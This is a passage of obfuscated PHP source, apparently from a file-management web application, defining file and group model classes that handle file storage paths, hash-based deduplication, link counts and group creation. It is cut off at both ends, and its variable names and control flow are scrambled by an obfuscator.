(isset($B¦Ÿ½©ÊµÌ[$DÔ—ÅÓœÇ„[$A‰ÇÖíßò[1691]]])) { $DÔ—ÅÓœÇ„[$A‰ÇÖíßò[1706]] = $B¦Ÿ½©ÊµÌ[$DÔ—ÅÓœÇ„[$A‰ÇÖíßò[1691]]]; } } unset($DÔ—ÅÓœÇ„); goto DÍÑÊîõ•Ä; DÍÑÊîõ•Ä: } private function _listAppendUser(&$Fí™Ü»Ş¿Ù) { goto CÁ¹Â¦±ì; CÁ¹Â¦±ì: $cÑãÂŠ´‰ğ =& $_SERVER[òÀöí]; $CÚø—Ò³’Ø = array_unique(array_to_keyvalue($Fí™Ü»Ş¿Ù, $cÑãÂŠ´‰ğ[33], $cÑãÂŠ´‰ğ[1504])); $CÚø—Ò³’Ø = array_remove_value($CÚø—Ò³’Ø, $cÑãÂŠ´‰ğ[486]); goto fœÍ”ŠÉâ; fœÍ”ŠÉâ: if (count($CÚø—Ò³’Ø) == 0) { return; } foreach ($Fí™Ü»Ş¿Ù as $EØµŸ¶ŞË) { if (isset($EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1706]])) { $CÚø—Ò³’Ø[] = $EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1706]][$cÑãÂŠ´‰ğ[1504]]; } } $e®ÕÅŒ¼ğ = Model($cÑãÂŠ´‰ğ[495])->userListInfo($CÚø—Ò³’Ø); goto eßÇ›ØÜ÷¤; eßÇ›ØÜ÷¤: foreach ($Fí™Ü»Ş¿Ù as &$EØµŸ¶ŞË) { $EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[551]] = $e®ÕÅŒ¼ğ[$EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1504]]]; if (isset($EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1706]])) { $EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1706]][$cÑãÂŠ´‰ğ[551]] = $e®ÕÅŒ¼ğ[$EØµŸ¶ŞË[$cÑãÂŠ´‰ğ[1706]][$cÑãÂŠ´‰ğ[1504]]]; } } unset($EØµŸ¶ŞË); goto C¬àˆ–˜µ; C¬àˆ–˜µ: } private function _listAppendMeta(&$côŸò²òÚ) { goto F²¾¸ÍßÆß; cÖáÆœÎ¦: if (!$Dœ´¿ïéÓ÷) { return; } foreach ($côŸò²òÚ as $F¡Üâîõ â) { if (isset($F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1706]])) { $Dœ´¿ïéÓ÷[] = $F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1706]][$cÅ±Ñæƒ‰Ö[1703]]; } } $DœÒÉ•ï’Ñ = $this->metaList($Dœ´¿ïéÓ÷); goto a”³‘Ìëå‚; F²¾¸ÍßÆß: $cÅ±Ñæƒ‰Ö =& $_SERVER[òÀöí]; $Dœ´¿ïéÓ÷ = array_unique(array_to_keyvalue($côŸò²òÚ, $cÅ±Ñæƒ‰Ö[33], $cÅ±Ñæƒ‰Ö[1703])); $Dœ´¿ïéÓ÷ = array_remove_value($Dœ´¿ïéÓ÷, $cÅ±Ñæƒ‰Ö[486]); goto cÖáÆœÎ¦; a”³‘Ìëå‚: if (!$DœÒÉ•ï’Ñ) { return !1; } foreach ($côŸò²òÚ as &$F¡Üâîõ â) { $F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[434]] = $DœÒÉ•ï’Ñ[$F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1703]]]; if (isset($F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1706]])) { $F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1706]][$cÅ±Ñæƒ‰Ö[434]] = $DœÒÉ•ï’Ñ[$F¡Üâîõ â[$cÅ±Ñæƒ‰Ö[1706]][$cÅ±Ñæƒ‰Ö[1703]]]; } } unset($F¡Üâîõ â); goto bÌ­Ê¤à¡; bÌ­Ê¤à¡: } private function metaList($d‚¨ˆŒÒ) { goto aĞÀİŞÀ“; aĞÀİŞÀ“: $B÷—ìŠõ¯‡ =& $_SERVER[òÀöí]; if (!$d‚¨ˆŒÒ) { return array(); } $Cİš‹İéˆÓ = array($B÷—ìŠõ¯‡[1703] => array($B÷—ìŠõ¯‡[7], $d‚¨ˆŒÒ)); goto Aä†¾İ’Ö; Aä†¾İ’Ö: $FºŸÙ—„ë = Model($B÷—ìŠõ¯‡[1707])->where($Cİš‹İéˆÓ)->select(); $FºŸÙ—„ë = array_to_keyvalue_group($FºŸÙ—„ë, $B÷—ìŠõ¯‡[1703]); foreach ($FºŸÙ—„ë as $E´‚ò‰ó£™ => $F‰±×Ìğ) { $Céù‹ÀÏ¾Å = array(); foreach ($F‰±×Ìğ as $Aˆ©òê‹¥) { $Céù‹ÀÏ¾Å[$Aˆ©òê‹¥[$B÷—ìŠõ¯‡[92]]] = $Aˆ©òê‹¥[$B÷—ìŠõ¯‡[368]]; } $FºŸÙ—„ë[$E´‚ò‰ó£™] = $Céù‹ÀÏ¾Å; } goto fˆƒ›„ÉÜ†; fˆƒ›„ÉÜ†: return $FºŸÙ—„ë ? $FºŸÙ—„ë : array(); goto fÇšŸŞÔ¬‚; fÇšŸŞÔ¬‚: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\x61\155\145" => "\151\x6f\137\146\151\x6c\145\137\x6d\x65\x74\141", "\x6d\145\164\141\106\x69\145\x6c\x64" => "\x66\151\154\145\111\104"); public function fileInfo($f¾ ƒˆË©Û) { $aŸ…†éĞãä =& $_SERVER[òÀöí]; static $FÖôùÀÄ²ˆ = array(); if (!isset($FÖôùÀÄ²ˆ[$f¾ ƒˆË©Û])) { $Bœ«îÊ¹¹¸ = $aŸ…†éĞãä[1708]; $AùËçôëÏĞ = Model($aŸ…†éĞãä[439])->field($Bœ«îÊ¹¹¸)->where(array($aŸ…†éĞãä[437] => $f¾ ƒˆË©Û))->find(); $FÖôùÀÄ²ˆ[$f¾ ƒˆË©Û] = $AùËçôëÏĞ; } return $FÖôùÀÄ²ˆ[$f¾ ƒˆË©Û]; } public function addFileByContent($dâá¢’À§ = '', $F³†¿ºîô = '') { goto DÏ„¯¬„ƒİ; DÏ„¯¬„ƒİ: $A×‘‰±‘²ˆ =& $_SERVER[òÀöí]; $eøí›ÕÍƒ = TEMP_PATH . $A×‘‰±‘²ˆ[1709]; if (!is_dir($eøí›ÕÍƒ)) { mk_dir($eøí›ÕÍƒ); } goto B‚§Öëí¯È; B‚§Öëí¯È: $eªçÜÃ¡ñ¦ = $eøí›ÕÍƒ . $A×‘‰±‘²ˆ[1710] . rand_string(16); file_put_contents($eªçÜÃ¡ñ¦, $dâá¢’À§); $ešµêáš¾ï = $this->addFile($eªçÜÃ¡ñ¦, $F³†¿ºîô, !0); goto A™„›œˆ´; A™„›œˆ´: if (file_exists($eªçÜÃ¡ñ¦)) { @unlink($eªçÜÃ¡ñ¦); } return $ešµêáš¾ï; goto dÌ®“ˆØŞÀ; dÌ®“ˆØŞÀ: } public function createFileName($a´–¨ëá†¥) { goto fƒ…™÷Û¶ƒ; EÔë­Ì¿´µ: if (!$aò‹ßê±² && !Cache::get($BÕÒµŸ­°)) { $aò‹ßê±² = !0; $C¬à‚´ˆÅ‹ = IO::mkdir($D­¨‡ÀË‹); if (!IO::exist($C¬à‚´ˆÅ‹ . $e¸‰Š§Æ¾´[1712])) { IO::mkfile($C¬à‚´ˆÅ‹ . $e¸‰Š§Æ¾´[1712]); } Cache::set($BÕÒµŸ­°, 1, 3600 * 2); } return $d‚Ç¦šî½É; goto Fó±¿ÔÈ»¿; fƒ…™÷Û¶ƒ: $e¸‰Š§Æ¾´ =& $_SERVER[òÀöí]; $DŒÈï­Ìñğ = IO::init($e¸‰Š§Æ¾´[8]); $d‚Ç¦šî½É = $this->makeFilePath($a´–¨ëá†¥, $DŒÈï­Ìñğ); goto aËÖÈ¿Æ”; aËÖÈ¿Æ”: $D­¨‡ÀË‹ = $DŒÈï­Ìñğ->pathFather($d‚Ç¦šî½É); static $aò‹ßê±² = false; $BÕÒµŸ­° = $e¸‰Š§Æ¾´[1711] . md5($D­¨‡ÀË‹); goto EÔë­Ì¿´µ; Fó±¿ÔÈ»¿: } public function makeFilePath($b¢¯”º³Ö­, $D£ã¯‚¤®‡) { goto D®È‰‚‹Û¨; CáğÃ¤¤‡: switch ($B¡ëòáĞ”“) { case $eµ¬‚Œ¼¯[1716]: $BÀ‹©ñßğÀ = $BÀ‹©ñßğÀ . $eµ¬‚Œ¼¯[94] . $D£ã¯‚¤®‡->ext($b¢¯”º³Ö­); if ($D£ã¯‚¤®‡->ext($b¢¯”º³Ö­) == $eµ¬‚Œ¼¯[1653]) { $BÀ‹©ñßğÀ .= $eµ¬‚Œ¼¯[1405]; } break; case $eµ¬‚Œ¼¯[1717]: goto dó”¸àÉ³Ë; dó”¸àÉ³Ë: $DÒ½¬—ÇÛä = Model($eµ¬‚Œ¼¯[1102])->get($eµ¬‚Œ¼¯[1401]); $fä§™æ¯± = substr(md5($eµ¬‚Œ¼¯[1718] . $DÒ½¬—ÇÛä . date($eµ¬‚Œ¼¯[706])), 0, 8); $AìØÖöô ³ = KodIO::defaultDriver(); goto BğÔÚ®ÄŒ; BğÔÚ®ÄŒ: $F“×«˜¼• = $eµ¬‚Œ¼¯[1100] . $AìØÖöô ³[$eµ¬‚Œ¼¯[385]] . $eµ¬‚Œ¼¯[1719] . date($eµ¬‚Œ¼¯[1720]) . $fä§™æ¯± . $eµ¬‚Œ¼¯[8]; if ($D£ã¯‚¤®‡->ext($b¢¯”º³Ö­) == $eµ¬‚Œ¼¯[1653]) { $b¢¯”º³Ö­ .= $eµ¬‚Œ¼¯[1405]; } $Eàõ›ˆ‹™ö = $eµ¬‚Œ¼¯[1721] . $F“×«˜¼• . $b¢¯”º³Ö­; goto D‘¤ˆ”Ù¿; FìšÕ ùÚ‡: if (IO::isTypeObject($BÀ‹©ñßğÀ) && !IO::isUploadServer($BÀ‹©ñßğÀ)) { $B¿ìõ¦Ê Ş = IO::setContent($BÀ‹©ñßğÀ, $eµ¬‚Œ¼¯[33]); if (!$B¿ìõ¦Ê Ş) { show_json($eµ¬‚Œ¼¯[1722], !1); } } CacheLock::unlock($Eàõ›ˆ‹™ö); break; goto Dò½ŠÃ”æ; D‘¤ˆ”Ù¿: CacheLock::lock($Eàõ›ˆ‹™ö); $FïÒ„áí¦ = IO::fileNameAuto($F“×«˜¼•, $b¢¯”º³Ö­); $BÀ‹©ñßğÀ = $F“×«˜¼• . $FïÒ„áí¦; goto FìšÕ ùÚ‡; Dò½ŠÃ”æ: case $eµ¬‚Œ¼¯[1715]: break; default: break; } return $BÀ‹©ñßğÀ; goto BëÄØ·ˆÓ°; D®È‰‚‹Û¨: $eµ¬‚Œ¼¯ =& $_SERVER[òÀöí]; $B¡ëòáĞ”“ = Model($eµ¬‚Œ¼¯[1102])->get($eµ¬‚Œ¼¯[1713]); $F“×«˜¼• = KodIO::defaultIO() . date($eµ¬‚Œ¼¯[1714]); goto b°ãä´—Ş; b°ãä´—Ş: $BÀ‹©ñßğÀ = $F“×«˜¼• . rand_string(5) . short_id(100); $b¢¯”º³Ö­ = str_replace($eµ¬‚Œ¼¯[8], $eµ¬‚Œ¼¯[70], KodIO::clear($b¢¯”º³Ö­)); if (!$b¢¯”º³Ö­) { $B¡ëòáĞ”“ = $eµ¬‚Œ¼¯[1715]; } goto CáğÃ¤¤‡; BëÄØ·ˆÓ°: } public function addFileByRemote($eå½ƒÖ’Ö¦, $B½‘¿ö¸†², $e°ª¢ùÖâæ = array()) { goto eåÕï½¬½ø; eåÕï½¬½ø: $dÉâÉ¦Ëí„ =& $_SERVER[òÀöí]; if (!IO::exist($eå½ƒÖ’Ö¦)) { return !1; } $eäéÅöõ = $e°ª¢ùÖâæ[$dÉâÉ¦Ëí„[169]] ? $e°ª¢ùÖâæ[$dÉâÉ¦Ëí„[169]] : $dÉâÉ¦Ëí„[33]; goto C¤†ö«„Ôè; C¤†ö«„Ôè: $cŞï—«…¸° = IO::hashMd5($eå½ƒÖ’Ö¦, $eäéÅöõ); $b‘Œ‰¬ÃğÚ = KodIO::defaultDriver(); $eöÃ±‚ˆÅã = array($dÉâÉ¦Ëí„[537] => IO::size($eå½ƒÖ’Ö¦), $dÉâÉ¦Ëí„[1723] => 1, $dÉâÉ¦Ëí„[404] => $B½‘¿ö¸†², $dÉâÉ¦Ëí„[762] => $b‘Œ‰¬ÃğÚ[$dÉâÉ¦Ëí„[385]], $dÉâÉ¦Ëí„[405] => $eå½ƒÖ’Ö¦, $dÉâÉ¦Ëí„[1724] => $e°ª¢ùÖâæ[$dÉâÉ¦Ëí„[170]] ? $e°ª¢ùÖâæ[$dÉâÉ¦Ëí„[170]] : IO::hashSimple($eå½ƒÖ’Ö¦), $dÉâÉ¦Ëí„[1725] => $cŞï—«…¸° ? $cŞï—«…¸° : $eäéÅöõ); goto d…©ã¿Î™; d…©ã¿Î™: if ($BŒ•ô—® = $this->addFileCheckExist($eöÃ±‚ˆÅã[$dÉâÉ¦Ëí„[170]], $eöÃ±‚ˆÅã[$dÉâÉ¦Ëí„[169]], $eöÃ±‚ˆÅã[$dÉâÉ¦Ëí„[77]])) { return $BŒ•ô—®; } return $this->addFileData($eöÃ±‚ˆÅã); goto e…†ĞÎÇ±; e…†ĞÎÇ±: } private function addFileData($Dí¯ëÉà†) { $b²ëº…”È =& $_SERVER[òÀöí]; if (!$Dí¯ëÉà†) { return !1; } $Dí¯ëÉà†[$b²ëº…”È[77]] = intval($Dí¯ëÉà†[$b²ëº…”È[77]]); if (!$Dí¯ëÉà†[$b²ëº…”È[77]] && strlen($Dí¯ëÉà†[$b²ëº…”È[170]]) > 32) { $Dí¯ëÉà†[$b²ëº…”È[77]] = intval(substr($Dí¯ëÉà†[$b²ëº…”È[170]], 32)); } $Cé‡®ŠâÌ = $this->add($Dí¯ëÉà†); return $this->find($Cé‡®ŠâÌ); } public function addFile($eÀÑ­ñŠêí, $B®ºáƒğ‡‘, $FŠÅŠÁ±Ü = false) { goto Bõä¡’‰Ãó; bÚáèµ•–: return $F’Šê—éÍ; goto C»†¾ï¢Â¾; EàÒèµŒ‘æ: $f®öÁŸ‚Çí = $this->addFileMake($eÀÑ­ñŠêí, $AªˆŞ„°ã, $bÓ¹Û¨áî›, $BÁŠ‹èáàÃ, $B®ºáƒğ‡‘, $FŠÅŠÁ±Ü); $F’Šê—éÍ = $this->addFileData($f®öÁŸ‚Çí); CacheLock::unlock($CÉ›™ß…«); goto bÚáèµ•–; D¢‹³‚¿ĞÇ: $CÉ›™ß…« = $_SERVER[òÀöí][1726] . $BÁŠ‹èáàÃ; CacheLock::lock($CÉ›™ß…«); if ($a÷ˆ”˜çâò = $this->addFileCheckExist($bÓ¹Û¨áî›, $BÁŠ‹èáàÃ, $AªˆŞ„°ã)) { CacheLock::unlock($CÉ›™ß…«); return $a÷ˆ”˜çâò; } goto EàÒèµŒ‘æ; Bõä¡’‰Ãó: $bÓ¹Û¨áî› = IO::hashSimple($eÀÑ­ñŠêí); $BÁŠ‹èáàÃ = IO::hashMd5($eÀÑ­ñŠêí); $AªˆŞ„°ã = IO::size($eÀÑ­ñŠêí); goto D¢‹³‚¿ĞÇ; C»†¾ï¢Â¾: } public function addFileMake($a‹Ü‹ôÌâí, $FŠò‡¶Åá, $cï×–å˜ã¢, $eª¡õ¢¬°–, $B´„……êœË, $C ’…°‹æ×) { goto D°î¼ä«À¯; eÆ¬µœÕô¬: $AàßèÏ¸ĞŠ = KodIO::defaultDriver(); $Cãª±ÑËÑÉ = array($A©âé‡‚»[537] => $FŠò‡¶Åá, $A©âé‡‚»[1723] => 1, $A©âé‡‚»[404] => $B´„……êœË, $A©âé‡‚»[762] => $AàßèÏ¸ĞŠ[$A©âé‡‚»[385]], $A©âé‡‚»[405] => $f¡Ò„Â¯„, $A©âé‡‚»[1724] => $cï×–å˜ã¢, $A©âé‡‚»[1725] => $eª¡õ¢¬°–); return $Cãª±ÑËÑÉ; goto F§½…¨¤é™; D°î¼ä«À¯: $A©âé‡‚» =& $_SERVER[òÀöí]; $f¡Ò„Â¯„ = $this->createFileName($B´„……êœË); $E¿±ºã–Äï = get_path_father($f¡Ò„Â¯„); goto bÏëš‹Ë›‚; bÏëš‹Ë›‚: $E¾Òğ•Øù = get_path_this($f¡Ò„Â¯„); if ($C ’…°‹æ×) { $aá¶Ôëœ = IO::move($a‹Ü‹ôÌâí, $E¿±ºã–Äï, !1, $E¾Òğ•Øù); } else { $aá¶Ôëœ = IO::copy($a‹Ü‹ôÌâí, $E¿±ºã–Äï, !1, $E¾Òğ•Øù); } if (!$aá¶Ôëœ) { return !1; } goto eÆ¬µœÕô¬; F§½…¨¤é™: } public function addFileCheckExist($aë’³Ôª‡ê, $e¦Öá”Ì, $få‡Ã“ñÕ) { $c¥ÌÈÍ±£Ö =& $_SERVER[òÀöí]; $f’Ø—¯µ = $this->findByHash($aë’³Ôª‡ê, $e¦Öá”Ì); if (!$f’Ø—¯µ) { return !1; } $B“ùĞİîÍÏ = array($c¥ÌÈÍ±£Ö[1723] => intval($f’Ø—¯µ[$c¥ÌÈÍ±£Ö[1727]]) + 1, $c¥ÌÈÍ±£Ö[537] => $få‡Ã“ñÕ); $this->where(array($c¥ÌÈÍ±£Ö[437] => $f’Ø—¯µ[$c¥ÌÈÍ±£Ö[436]]))->save($B“ùĞİîÍÏ); return $f’Ø—¯µ; } public function remove($dëàã­‹©) { $this->linkCountChange($dëàã­‹©, !1); $this->clearEmpty(); return !0; } public function linkAdd($bÊ‰æ¯ ƒ) { $this->linkCountChange($bÊ‰æ¯ ƒ, !0); } public function linkCountChange($A­½ÊŞ—ÄŠ, $b¤”öæÄç) { goto fÎÜ·Ä‡ ; a˜ªø‘Î’Ä: $aµö“Êï§ä = array(); foreach ($A­½ÊŞ—ÄŠ as $E§äßºÚ ) { $bĞØÅŞ¼³Œ = $E§äßºÚ  . $E“ê¼‹Âç›[33]; if (!$aµö“Êï§ä[$bĞØÅŞ¼³Œ]) { $aµö“Êï§ä[$bĞØÅŞ¼³Œ] = 0; } $aµö“Êï§ä[$bĞØÅŞ¼³Œ]++; } $f£âƒîÙ— = array(); goto ağº½Ú¿ÓÈ; fÎÜ·Ä‡ : $E“ê¼‹Âç› =& $_SERVER[òÀöí]; if (!$A­½ÊŞ—ÄŠ) { return; } if (!is_array($A­½ÊŞ—ÄŠ)) { $A­½ÊŞ—ÄŠ = array($A­½ÊŞ—ÄŠ); } goto a˜ªø‘Î’Ä; ağº½Ú¿ÓÈ: foreach ($aµö“Êï§ä as $E§äßºÚ  => $dœÛ¾»ÄÕ) { $bĞØÅŞ¼³Œ = $dœÛ¾»ÄÕ . $E“ê¼‹Âç›[33]; if (!$f£âƒîÙ—[$bĞØÅŞ¼³Œ]) { $f£âƒîÙ—[$bĞØÅŞ¼³Œ] = array(); } $f£âƒîÙ—[$bĞØÅŞ¼³Œ][] = $E§äßºÚ ; } foreach ($f£âƒîÙ— as $dœÛ¾»ÄÕ => $a³âğĞ²öÛ) { if (!$a³âğĞ²öÛ) { continue; } $dœÛ¾»ÄÕ = $b¤”öæÄç ? $dœÛ¾»ÄÕ : -intval($dœÛ¾»ÄÕ); $B á–×Û‹ = array($E“ê¼‹Âç›[436] => array($E“ê¼‹Âç›[7], $a³âğĞ²öÛ)); if ($dœÛ¾»ÄÕ < 0) { $B á–×Û‹[$E“ê¼‹Âç›[1727]] = array($E“ê¼‹Âç›[951], abs($dœÛ¾»ÄÕ)); } $this->where($B á–×Û‹)->setAdd($E“ê¼‹Âç›[1727], $dœÛ¾»ÄÕ); } goto F°ù†‡–èœ; F°ù†‡–èœ: } public function findByHash($C÷¡áíùá÷, $dªÕÕàæó = false) { $B•¡ğÈêÎ‚ =& $_SERVER[òÀöí]; if (!$C÷¡áíùá÷ && !$dªÕÕàæó) { return !1; } $D’‹ğ§øäÌ = array($B•¡ğÈêÎ‚[1724] => $C÷¡áíùá÷); if ($dªÕÕàæó) { $D’‹ğ§øäÌ = array($B•¡ğÈêÎ‚[1725] => $dªÕÕàæó); } return $this->order($B•¡ğÈêÎ‚[1728])->where($D’‹ğ§øäÌ)->find(); } public function clearEmpty($c–§˜ˆ˜ßğ = 0) { goto CÓ×õ¸²ì‘; E§ùõÊÙÒ: $eã‚ÏŸöö = $this->where($f©¢¹ø)->select(); if (!$eã‚ÏŸöö) { return; } $CËğŠçª£ò = new Task($eö­ÔîöÛ[1730], $eö­ÔîöÛ[33], count($eã‚ÏŸöö)); goto A…ëä•Õ±¹; CÓ×õ¸²ì‘: $eö­ÔîöÛ =& $_SERVER[òÀöí]; $B†ĞùÚÜß‚ = time() - 3600 * 24 * $c–§˜ˆ˜ßğ; $f©¢¹ø = $eö­ÔîöÛ[1729] . $B†ĞùÚÜß‚; goto E§ùõÊÙÒ; A…ëä•Õ±¹: foreach ($eã‚ÏŸöö as $AÊ„÷­ŒÈ) { $CËğŠçª£ò->update(1); $this->resetFile($AÊ„÷­ŒÈ); } $CËğŠçª£ò->end(); goto f•ê¢ãƒ’; f•ê¢ãƒ’: } public function resetFile($e¯‰áîÓŞ¢) { goto A£¬Š…ª; E‹Ä—Ù«Ô«: if ($e¯‰áîÓŞ¢[$a ÄãÊùˆÑ[1727]] != $F÷¦Ö†Ü½à) { $this->where($A•¹”Ş‘è•)->save(array($a ÄãÊùˆÑ[1723] => $F÷¦Ö†Ü½à)); } goto a àíÁ•¿›; A£¬Š…ª: $a ÄãÊùˆÑ =& $_SERVER[òÀöí]; $A•¹”Ş‘è• = array($a ÄãÊùˆÑ[437] => $e¯‰áîÓŞ¢[$a ÄãÊùˆÑ[436]]); $DŒÒ§øÎĞñ = Model($a ÄãÊùˆÑ[1181])->where($A•¹”Ş‘è•)->count(); goto e†¸¾°’×; e†¸¾°’×: $Eõà£½•ãÆ = Model($a ÄãÊùˆÑ[1731])->where($A•¹”Ş‘è•)->count(); $F÷¦Ö†Ü½à = intval($DŒÒ§øÎĞñ) + intval($Eõà£½•ãÆ); if ($F÷¦Ö†Ü½à == 0) { IO::remove($e¯‰áîÓŞ¢[$a ÄãÊùˆÑ[75]]); $this->where($A•¹”Ş‘è•)->delete(); $this->metaSet($e¯‰áîÓŞ¢[$a ÄãÊùˆÑ[436]], null, null); return; } goto E‹Ä—Ù«Ô«; a àíÁ•¿›: } public function storageInfo($bÆáÜ©¼©± = false) { goto BÄöö ÀçÄ; fÙ§™µ‘–Ê: $bÓë¨½Ä¡ñ = 1; $eËõ™¨Ëë° = 0; $f±Ó©ëÙ¹İ = 5000; goto DÔ¨Õ“ÜÎ; BÄöö ÀçÄ: $E—¥«œÔ¯‡ =& $_SERVER[òÀöí]; $f“æŸÓ í° = $this->count() + 0.0; $DÙĞ¤±´ˆ‡ = 0; goto fÙ§™µ‘–Ê; DÔ¨Õ“ÜÎ: for ($cçš©è°­Ì = 0; $cçš©è°­Ì < $f“æŸÓ í°; $cçš©è°­Ì = $cçš©è°­Ì + $f±Ó©ëÙ¹İ) { $d•…ğëºø¶ = $this->limit($cçš©è°­Ì, $cçš©è°­Ì + $f±Ó©ëÙ¹İ)->select(); foreach ($d•…ğëºø¶ as $cÛÇ¢—”ê¾) { $bÓë¨½Ä¡ñ += $cÛÇ¢—”ê¾[$E—¥«œÔ¯‡[77]] * $cÛÇ¢—”ê¾[$E—¥«œÔ¯‡[1727]]; $DÙĞ¤±´ˆ‡ += $cÛÇ¢—”ê¾[$E—¥«œÔ¯‡[77]] * ($cÛÇ¢—”ê¾[$E—¥«œÔ¯‡[1727]] - 1); $eËõ™¨Ëë° += $cÛÇ¢—”ê¾[$E—¥«œÔ¯‡[1727]]; } } $DÂ¢¶‰ì‹Ú = array($E—¥«œÔ¯‡[1732] => $bÓë¨½Ä¡ñ, $E—¥«œÔ¯‡[1733] => $DÙĞ¤±´ˆ‡, $E—¥«œÔ¯‡[1734] => $DÙĞ¤±´ˆ‡ / $bÓë¨½Ä¡ñ, $E—¥«œÔ¯‡[81] => $f“æŸÓ í°, $E—¥«œÔ¯‡[1735] => $eËõ™¨Ëë°); return $DÂ¢¶‰ì‹Ú; goto DŠÇ‘Åå; DŠÇ‘Åå: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\x65" => "\x67\162\x6f\x75\x70\137\155\145\x74\x61", "\155\x65\x74\141\106\x69\145\154\144" => "\147\162\157\165\x70\x49\104"); protected function cacheFunctionAlias($D§„Ÿ¡˜¾) { $cË÷ºÃ‘ªÁ =& $_SERVER[òÀöí]; return array($cË÷ºÃ‘ªÁ[1736] => array($D§„Ÿ¡˜¾[0], $cË÷ºÃ‘ªÁ[1737]), $cË÷ºÃ‘ªÁ[1738] => array($D§„Ÿ¡˜¾[0], $cË÷ºÃ‘ªÁ[1737])); } protected function getInfo($böÌñ½Ûø) { $c™ÜÈ•ßŒ÷ = $this->getInfoSimple($böÌñ½Ûø); if (!$c™ÜÈ•ßŒ÷) { return !1; } return $this->_listDataApplyItem($c™ÜÈ•ßŒ÷); } protected function getInfoSimple($E­©¿ó“¾¦, $DÔÀ„¾‰æÅ = false) { $D¼Ó‰Ã¡ï =& $_SERVER[òÀöí]; if ($DÔÀ„¾‰æÅ) { $DŠŒˆå¨ì¡ = array($D¼Ó‰Ã¡ï[1663] => intval($E­©¿ó“¾¦)); $eƒÁ¤Ğ¶å = $this->where($DŠŒˆå¨ì¡)->find(); return is_array($eƒÁ¤Ğ¶å) ? $eƒÁ¤Ğ¶å : array(); } return $this->cacheFunctionGet($D¼Ó‰Ã¡ï[1739], $E­©¿ó“¾¦); } protected function groupAdd($b¶ÓÄ¶¾ùÃ) { goto eÕøÉ¥—È¿; dÉùÏğ¬÷æ: if (isset($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1742]])) { $this->metaSet($E¢šêÌ¦å, array($dŒ¤²²¯•[1742] => $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1742]], $dŒ¤²²¯•[1743] => $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1743]])); unset($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1742]]); unset($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1743]]); } Model($dŒ¤²²¯•[1181])->groupRootAdd($E¢šêÌ¦å); return $E¢šêÌ¦å; goto AË¾îÇŠ«; c†ĞùëµÃ: if (!empty($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]])) { $BŒ÷ÃâÚ—[$dŒ¤²²¯•[1663]] = $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]]; } $E¢šêÌ¦å = $this->add($BŒ÷ÃâÚ—); $this->setNamePinyin($E¢šêÌ¦å, $BŒ÷ÃâÚ—[$dŒ¤²²¯•[28]]); goto dÉùÏğ¬÷æ; b°ƒğòÓí: if ($f×†‘î¬ÀÉ[$dŒ¤²²¯•[477]]) { $D×±™½¤Û« = $f×†‘î¬ÀÉ[$dŒ¤²²¯•[477]] . $f×†‘î¬ÀÉ[$dŒ¤²²¯•[1663]] . $dŒ¤²²¯•[47]; } $BŒ÷ÃâÚ— = array($dŒ¤²²¯•[404] => $this->groupNameAuto($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[479]], $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[28]]), $dŒ¤²²¯•[386] => $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[479]], $dŒ¤²²¯•[542] => $D×±™½¤Û«, $dŒ¤²²¯•[1740] => $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1647]], $dŒ¤²²¯•[1741] => 0, $dŒ¤²²¯•[1667] => 0); if (isset($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1686]])) { $BŒ÷ÃâÚ—[$dŒ¤²²¯•[1686]] = $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1686]]; } else { $e—Î†š–„ = $this->max($dŒ¤²²¯•[1686]); if (!$e—Î†š–„) { $e—Î†š–„ = 0; } $BŒ÷ÃâÚ—[$dŒ¤²²¯•[1686]] = $e—Î†š–„ + 1; } goto c†ĞùëµÃ; eÕøÉ¥—È¿: $dŒ¤²²¯• =& $_SERVER[òÀöí]; if (!$b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[479]] && isset($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]]) && $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]] == 1) { if ($f×†‘î¬ÀÉ = $this->getInfoSimple($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]], !0)) { return $b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[1663]]; } } else { $f×†‘î¬ÀÉ = $this->getInfoSimple($b¶ÓÄ¶¾ùÃ[$dŒ¤²²¯•[479]]); if (!$f×†‘î¬ÀÉ) { return !1; } } $D×±™½¤Û« = $dŒ¤²²¯•[488]; goto b°ƒğòÓí; AË¾îÇŠ«: } protected function groupEdit($Fà¿Î¨˜öÚ, $a˜©Û¡³Ø¾) { $e¬ÔùŠä±¤ =& $_SERVER[òÀöí]; if (!empty($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[479]])) { $eˆİ‚›Şƒ = $this->getInfoSimple($Fà¿Î¨˜öÚ); $Dâç„¤Ñ‰ä = $this->getInfoSimple($a˜©Û¡³Ø¾[$e¬ÔùŠä±¤[479]]); if (!$eˆİ‚›Şƒ || !$Dâç„¤Ñ‰ä) { return !1; } if ($eˆİ‚›Şƒ[$e¬ÔùŠä±¤[1663]] == 